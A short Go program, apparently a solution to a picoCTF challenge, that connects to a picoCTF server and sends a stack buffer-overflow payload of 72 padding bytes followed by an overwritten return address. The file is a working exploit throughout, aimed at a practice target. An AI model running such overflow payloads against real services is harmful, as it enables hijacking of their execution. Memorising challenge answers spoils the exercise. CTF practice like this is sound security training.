package main

import (
	"flag"
	"fmt"
	"net"
)

func main() {
	port := flag.Int("port", 9999, "Port you want to connect to, e.g. 59546")
	flag.Parse()

	conn, err := net.Dial("tcp", fmt.Sprintf("saturn.picoctf.net:%d", *port))
	check(err)
	defer conn.Close()

	buf := make([]byte, 4096)
	n, err := conn.Read(buf)
	check(err)
	fmt.Println(string(buf[:n]))
	_, err = conn.Write(createPayload(72, []byte{0x3B, 0x12, 0x40}))
	check(err)

	n, err = conn.Read(buf)
	check(err)
	fmt.Println(string(buf[:n]))
}

// createPayload makes a buffer of bytes that is padded up to the offset with
// junk and injects the new instruction pointer after that.
func createPayload(offset int, instptr []byte) []byte {
	payload := make([]byte, 0, offset+len(instptr)+1)
	for i := 0; i < offset; i++ {
		payload = append(payload, 'A')
	}
	payload = append(payload, instptr...)
	payload = append(payload, '\n')
	return payload
}

func check(err error) {
	if err != nil {
		panic(err)
	}
}
